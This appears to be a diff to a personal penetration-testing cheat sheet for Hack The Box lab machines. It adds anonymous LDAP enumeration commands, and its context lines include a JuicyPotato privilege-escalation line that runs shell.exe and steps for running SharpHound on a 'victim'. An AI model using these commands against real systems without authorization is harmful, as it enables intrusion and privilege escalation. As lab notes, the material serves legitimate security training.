@@ -286,7 +286,9 @@ Password Protected SSH Private Key:
 				- juicypotato86.exe -l 1337 -p shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 	
 	- LDAP
-		- ldapsearch: ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
+		- To get DN "dc=htb,dc=local": ldapsearch -h 10.10.10.161 -x -s base namingcontexts 
+		- ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
+		- To query for user info: ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local" '(objectClass=Person)'
 	- Extract LDAP Data using bloodhound: 
 		- Download SharpHound.ps1 into the victim
 		- Execute SharpHound.ps1 on the vicitm: .\SharpHound.ps1
